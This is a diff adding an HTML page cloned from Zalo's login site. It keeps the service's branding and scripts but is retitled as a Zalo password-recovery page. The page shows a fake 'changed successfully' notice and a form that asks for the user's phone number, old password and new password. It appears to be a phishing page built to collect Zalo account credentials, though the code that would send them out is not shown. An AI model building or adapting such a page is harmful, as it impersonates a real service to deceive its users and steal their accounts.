@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<!-- saved from url=(0064)https://id.zalo.me/account/login?continue=https://chat.zalo.me/# -->
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="robots" content="noindex">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="keywords" content="dang nhap zalo, zalo web, dang nhap zalo web.">
+    <meta name="description" content="Trang đăng nhập vào Zalo Web sử dụng chung tài khoản zalo trên mobile. Bạn cũng có thể đăng nhập bằng cách quét mã QR và dùng tài khoản facebook.">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link id="favico" rel="icon" type="image/png" href="https://id.zalo.me/account/static/images/favicon.ico">
+    <link href="./zalo_files/main-3.4.6.css" rel="stylesheet">
+    <title>Khôi phục mật khẩu Zalo</title>
+    <script src="./zalo_files/sdk.js.download" async="" crossorigin="anonymous"></script>
+    <script id="facebook-jssdk" src="./zalo_files/sdk.js(1).download"></script>
+    <script type="text/javascript" async="" src="./zalo_files/recaptcha__vi.js.download"></script>
+    <script async="" src="./zalo_files/za.js.download"></script>
+    <script async="" src="./zalo_files/analytics.js.download"></script>
+    <script>
+        var continueUrl = 'https%3A%2F%2Fchat%2Ezalo%2Eme%2F';
+                    var apiDomain = 'https://id.zalo.me/account';
+                    var isActiveReCaptcha = true;
+                    window.recaptchaOptions = {
+                    lang: 'vi'
+                    }
+            var url = new URL(window.location.href);
+                    var needRetry = false;
+                    if (needRetry){
+            if (window.location.href.indexOf("?") >= 0){
+            window.location.href = window.location.href + "&needRetry=false";
+            } else
+                    window.location.href = window.location.href + "?needRetry=false";
+            }
+        </script>
+    <script async="">
+        (function(i, s, o, g, r, a, m) {
+            i['GoogleAnalyticsObject'] = r;
+                    i[r] = i[r] || function() {
+            (i[r].q = i[r].q || []).push(arguments)
+            }, i[r].l = 1 * new Date();
+                    a = s.createElement(o),
+                    m = s.getElementsByTagName(o)[0];
+                    a.async = 1;
+                    a.src = g;
+                    m.parentNode.insertBefore(a, m)
+            })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+                    ga('create', 'UA-108352130-1', 'auto');
+                    ga('send', 'pageview');</script>
+    <script async="">
+        var _zap = _zap || [];
+                    _zap.push(["_setAccount", "ZA-43334183020948"]);
+                    (function (e, t, n, r, a, o, c) {
+                    e[a + "_q"] = e[a + "_q"] || [], e[a] = e[a] || {};
+                            var s = ["trackPageview", "trackEvent", "getVisitorID"];
+                            for (i in s)
+                            e[a][s[i]] = function (t) {
+                    return function () {
+                    e[a + "_q"].push([t, arguments])
+                    }
+                    }(s[i]);
+                            o = t.createElement(n), c = t.getElementsByTagName(n)[0], o.async = 1, o.src = r + "?" + Math.floor((new Date).getTime() / 86400000), c.parentNode.insertBefore(o, c);
+                    })(window, document, "script", "//stc.za.zaloapp.com/v3/za.js", "ZA");</script>
+    <style type="text/css">
+    .fb_hidden {
+        position: absolute;
+        top: -10000px;
+        z-index: 10001
+    }
+
+    .fb_reposition {
+        overflow: hidden;
+        position: relative
+    }
+
+    .fb_invisible {
+        display: none
+    }
+
+    .fb_reset {
+        background: none;
+        border: 0;
+        border-spacing: 0;
+        color: #000;
+        cursor: auto;
+        direction: ltr;
+        font-family: "lucida grande", tahoma, verdana, arial, sans-serif;
+        font-size: 11px;
+        font-style: normal;
+        font-variant: normal;
+        font-weight: normal;
+        letter-spacing: normal;
+        line-height: 1;
+        margin: 0;
+        overflow: visible;
+        padding: 0;
+        text-align: left;
+        text-decoration: none;
+        text-indent: 0;
+        text-shadow: none;
+        text-transform: none;
+        visibility: visible;
+        white-space: normal;
+        word-spacing: normal
+    }
+
+    .fb_reset>div {
+        overflow: hidden
+    }
+
+    @keyframes fb_transform {
+        from {
+            opacity: 0;
+            transform: scale(.95)
+        }
+
+        to {
+            opacity: 1;
+            transform: scale(1)
+        }
+    }
+
+    .fb_animate {
+        animation: fb_transform .3s forwards
+    }
+
+    .fb_dialog {
+        background: rgba(82, 82, 82, .7);
+        position: absolute;
+        top: -10000px;
+        z-index: 10001
+    }
+
+    .fb_dialog_advanced {
+        border-radius: 8px;
+        padding: 10px
+    }
+
+    .fb_dialog_content {
+        background: #fff;
+        color: #373737
+    }
+
+    .fb_dialog_close_icon {
+        background: url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;
+        cursor: pointer;
+        display: block;
+        height: 15px;
+        position: absolute;
+        right: 18px;
+        top: 17px;
+        width: 15px
+    }
+
+    .fb_dialog_mobile .fb_dialog_close_icon {
+        left: 5px;
+        right: auto;
+        top: 5px
+    }
+
+    .fb_dialog_padding {
+        background-color: transparent;
+        position: absolute;
+        width: 1px;
+        z-index: -1
+    }
+
+    .fb_dialog_close_icon:hover {
+        background: url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent
+    }
+
+    .fb_dialog_close_icon:active {
+        background: url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent
+    }
+
+    .fb_dialog_iframe {
+        line-height: 0
+    }
+
+    .fb_dialog_content .dialog_title {
+        background: #6d84b4;
+        border: 1px solid #365899;
+        color: #fff;
+        font-size: 14px;
+        font-weight: bold;
+        margin: 0
+    }
+
+    .fb_dialog_content .dialog_title>span {
+        background: url(https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;
+        float: left;
+        padding: 5px 0 7px 26px
+    }
+
+    body.fb_hidden {
+        height: 100%;
+        left: 0;
+        margin: 0;
+        overflow: visible;
+        position: absolute;
+        top: -10000px;
+        transform: none;
+        width: 100%
+    }
+
+    .fb_dialog.fb_dialog_mobile.loading {
+        background: url(https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;
+        min-height: 100%;
+        min-width: 100%;
+        overflow: hidden;
+        position: absolute;
+        top: 0;
+        z-index: 10001
+    }
+
+    .fb_dialog.fb_dialog_mobile.loading.centered {
+        background: none;
+        height: auto;
+        min-height: initial;
+        min-width: initial;
+        width: auto
+    }
+
+    .fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner {
+        width: 100%
+    }
+
+    .fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content {
+        background: none
+    }
+
+    .loading.centered #fb_dialog_loader_close {
+        clear: both;
+        color: #fff;
+        display: block;
+        font-size: 18px;
+        padding-top: 20px
+    }
+
+    #fb-root #fb_dialog_ipad_overlay {
+        background: rgba(0, 0, 0, .4);
+        bottom: 0;
+        left: 0;
+        min-height: 100%;
+        position: absolute;
+        right: 0;
+        top: 0;
+        width: 100%;
+        z-index: 10000
+    }
+
+    #fb-root #fb_dialog_ipad_overlay.hidden {
+        display: none
+    }
+
+    .fb_dialog.fb_dialog_mobile.loading iframe {
+        visibility: hidden
+    }
+
+    .fb_dialog_mobile .fb_dialog_iframe {
+        position: sticky;
+        top: 0
+    }
+
+    .fb_dialog_content .dialog_header {
+        background: linear-gradient(from(#738aba), to(#2c4987));
+        border-bottom: 1px solid;
+        border-color: #1d3c78;
+        box-shadow: white 0 1px 1px -1px inset;
+        color: #fff;
+        font: bold 14px Helvetica, sans-serif;
+        text-overflow: ellipsis;
+        text-shadow: rgba(0, 30, 84, .296875) 0 -1px 0;
+        vertical-align: middle;
+        white-space: nowrap
+    }
+
+    .fb_dialog_content .dialog_header table {
+        height: 43px;
+        width: 100%
+    }
+
+    .fb_dialog_content .dialog_header td.header_left {
+        font-size: 12px;
+        padding-left: 5px;
+        vertical-align: middle;
+        width: 60px
+    }
+
+    .fb_dialog_content .dialog_header td.header_right {
+        font-size: 12px;
+        padding-right: 5px;
+        vertical-align: middle;
+        width: 60px
+    }
+
+    .fb_dialog_content .touchable_button {
+        background: linear-gradient(from(#4267B2), to(#2a4887));
+        background-clip: padding-box;
+        border: 1px solid #29487d;
+        border-radius: 3px;
+        display: inline-block;
+        line-height: 18px;
+        margin-top: 3px;
+        max-width: 85px;
+        padding: 4px 12px;
+        position: relative
+    }
+
+    .fb_dialog_content .dialog_header .touchable_button input {
+        background: none;
+        border: none;
+        color: #fff;
+        font: bold 12px Helvetica, sans-serif;
+        margin: 2px -12px;
+        padding: 2px 6px 3px 6px;
+        text-shadow: rgba(0, 30, 84, .296875) 0 -1px 0
+    }
+
+    .fb_dialog_content .dialog_header .header_center {
+        color: #fff;
+        font-size: 16px;
+        font-weight: bold;
+        line-height: 18px;
+        text-align: center;
+        vertical-align: middle
+    }
+
+    .fb_dialog_content .dialog_content {
+        background: url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;
+        border: 1px solid #4a4a4a;
+        border-bottom: 0;
+        border-top: 0;
+        height: 150px
+    }
+
+    .fb_dialog_content .dialog_footer {
+        background: #f5f6f7;
+        border: 1px solid #4a4a4a;
+        border-top-color: #ccc;
+        height: 40px
+    }
+
+    #fb_dialog_loader_close {
+        float: left
+    }
+
+    .fb_dialog.fb_dialog_mobile .fb_dialog_close_button {
+        text-shadow: rgba(0, 30, 84, .296875) 0 -1px 0
+    }
+
+    .fb_dialog.fb_dialog_mobile .fb_dialog_close_icon {
+        visibility: hidden
+    }
+
+    #fb_dialog_loader_spinner {
+        animation: rotateSpinner 1.2s linear infinite;
+        background-color: transparent;
+        background-image: url(https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);
+        background-position: 50% 50%;
+        background-repeat: no-repeat;
+        height: 24px;
+        width: 24px
+    }
+
+    @keyframes rotateSpinner {
+        0% {
+            transform: rotate(0deg)
+        }
+
+        100% {
+            transform: rotate(360deg)
+        }
+    }
+
+    .fb_iframe_widget {
+        display: inline-block;
+        position: relative
+    }
+
+    .fb_iframe_widget span {
+        display: inline-block;
+        position: relative;
+        text-align: justify
+    }
+
+    .fb_iframe_widget iframe {
+        position: absolute
+    }
+
+    .fb_iframe_widget_fluid_desktop,
+    .fb_iframe_widget_fluid_desktop span,
+    .fb_iframe_widget_fluid_desktop iframe {
+        max-width: 100%
+    }
+
+    .fb_iframe_widget_fluid_desktop iframe {
+        min-width: 220px;
+        position: relative
+    }
+
+    .fb_iframe_widget_lift {
+        z-index: 1
+    }
+
+    .fb_iframe_widget_fluid {
+        display: inline
+    }
+
+    .fb_iframe_widget_fluid span {
+        width: 100%
+    }
+    </style>
+</head>
+
+<body>
+    <div id="app" class="wrapper-page has-mobile">
+        <div class="wrapper-page is-only-desktop">
+            <div class="zLogin-layout parentDisable">
+                <div>
+                    <div>
+                        <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px;">
+                            <div class="grecaptcha-logo"><iframe src="./zalo_files/anchor.html" width="256" height="60" role="presentation" name="a-dq5ieo9ne62u" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div>
+                            <div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
+                        </div>
+                    </div>
+                </div>
+                <div class="header">
+                    <h1><a class="logo"></a></h1>
+                    <h2 class="hide-on-med-and-down">Khôi phục mật khẩu Zalo</h2>
+                </div>
+                <div class="body">
+                    <div>
+                        <div>
+                            <div class="body-container">
+                                <div>
+                                    <div class="content">
+                                        <div class="form-signin has-pad">
+                                            <div>
+                                                <div class="box-au">
+                                                    
+                                                    <p><span class="number-phone">Đã thay đổi thành công</span></p>
+                                                    <p>Chúng tôi đã cập nhật mật khẩu mới cho phiên đăng nhập hiện tại trên thiết bị của bạn. Nên bạn không cần đăng xuất.</p>
+                                                    
+                                                </div>
+                                                <div class="box-au box-forgot">
+                                                    <div class="line-form has-ico custom_password_form"><input tabindex="1" autocomplete="off" type="text" placeholder="Số điện thoại đăng ký."></div>
+                                                    <div class="line-form has-ico custom_password_form"><input tabindex="2" autocomplete="off" type="password" placeholder="Vui lòng nhập mật khẩu cũ"></div>
+                                                    <div class="line-form has-ico custom_password_form"><input tabindex="3" autocomplete="off" type="password" placeholder="Vui lòng nhập mật khẩu mới."></div>
+                                                    <div class="line-form has-ico custom_password_form"><input tabindex="4" autocomplete="off" type="password" placeholder="Nhập lại mật khẩu mới"></div>
+                                                </div>
+                                                <p class="textAlign-center"><a tabindex="5" class="btn btn--m" href="javascript:void(0)">Xác nhận</a></p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer">
+                    <p class="select-lang"><a class="lang" href="javascript:void(0)" style="font-weight: bold;">Tiếng Việt</a><a class="lang" href="javascript:void(0)">English</a></p>
+                    <p>Dùng tài khoản Zalo để truy cập các ứng dụng của ZA</p>
+                    <div class="logos">
+                        <ul>
+                            <li><a href="http://zalo.me/" target="_blank" class="logo-zalo"><i class="logo-zalo">Zalo</i></a></li>
+                            <li><a href="http://mp3.zing.vn/" target="_blank" class="logo-zingmp3"><i class="logo-zingmp3">ZingMp3</i></a></li>
+                            <li><a href="http://tv.zing.vn/" target="_blank" class="logo-zingtv"><i class="logo-zingtv">ZingTV</i></a></li>
+                            <li><a href="http://zing.vn/" target="_blank" class="logo-zing"><i class="logo-zing">Zing</i></a></li>
+                            <li><a href="http://baomoi.com/" target="_blank" class="logo-baomoi"><i class="logo-baomoi">Baomoi</i></a></li>
+                        </ul>
+                    </div>
+                </div>
+                <div id="logTest"></div>
+            </div>
+            <div id="test1"></div>
+        </div>
+    </div>
+    <div class="bg-svg">
+        <svg jsname="" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 810" preserveAspectRatio="xMinYMin slice" aria-hidden="true">
+            <path fill="#f6fafc" d="M592.66 0c-15 64.092-30.7 125.285-46.598 183.777C634.056 325.56 748.348 550.932 819.642 809.5h419.672C1184.518 593.727 1083.124 290.064 902.637 0H592.66z"></path>
+            <path fill="#f4f8fb" d="M545.962 183.777c-53.796 196.576-111.592 361.156-163.49 490.74 11.7 44.494 22.8 89.49 33.1 134.883h404.07c-71.294-258.468-185.586-483.84-273.68-625.623z"></path>
+            <path fill="#fcfdfe" d="M153.89 0c74.094 180.678 161.088 417.448 228.483 674.517C449.67 506.337 527.063 279.465 592.56 0H153.89z"></path>
+            <path fill="#f2f6f9" d="M153.89 0H0v809.5h415.57C345.477 500.938 240.884 211.874 153.89 0z"></path>
+            <path fill="#fcfdfe" d="M1144.22 501.538c52.596-134.583 101.492-290.964 134.09-463.343 1.2-6.1 2.3-12.298 3.4-18.497 0-.2.1-.4.1-.6 1.1-6.3 2.3-12.7 3.4-19.098H902.536c105.293 169.28 183.688 343.158 241.684 501.638v-.1z"></path>
+            <path fill="#eef4f8" d="M1285.31 0c-2.2 12.798-4.5 25.597-6.9 38.195C1321.507 86.39 1379.603 158.98 1440 257.168V0h-154.69z"></path>
+            <path fill="#f4f8fb" d="M1278.31,38.196C1245.81,209.874 1197.22,365.556 1144.82,499.838L1144.82,503.638C1185.82,615.924 1216.41,720.211 1239.11,809.6L1439.7,810L1439.7,256.768C1379.4,158.78 1321.41,86.288 1278.31,38.195L1278.31,38.196z"></path>
+        </svg>
+    </div>
+    <script type="text/javascript" src="./zalo_files/main-3.4.6.js.download" crossorigin="anonymous" async=""></script>
+    <script src="./zalo_files/api.js.download" defer=""></script>
+    <script>
+    (function() {
+        if (!/beta.id.zalo.me/.test(window.location.hostname)) return;
+        var src = '//cdn.jsdelivr.net/npm/eruda';
+        document.write('<scr' + 'ipt src="' + src + '"></scr' + 'ipt>');
+        document.write('<scr' + 'ipt>eruda.init();</scr' + 'ipt>');
+    })();
+    </script>
+    <script defer="" src="./zalo_files/sdk.js(2).download"></script>
+    <script>
+    window.zprj = 'zalo-account';
+    </script>
+    <div id="fb-root" class=" fb_reset">
+        <div style="position: absolute; top: -10000px; width: 0px; height: 0px;">
+            <div></div>
+            <div><iframe name="fb_xdm_frame_https" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" allow="encrypted-media" id="fb_xdm_frame_https" aria-hidden="true" title="Facebook Cross Domain Communication Frame" tabindex="-1" src="./zalo_files/d_vbiawPdxB.html" style="border: none;"></iframe></div>
+        </div>
+    </div>
+    <div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0;">
+        <div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;"></div>
+        <div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: absolute; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255); overflow: hidden;"><iframe title="hình xác thực recaptcha" src="./zalo_files/bframe.html" name="c-dq5ieo9ne62u" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div>
+    </div>
+</body>
+
+</html>
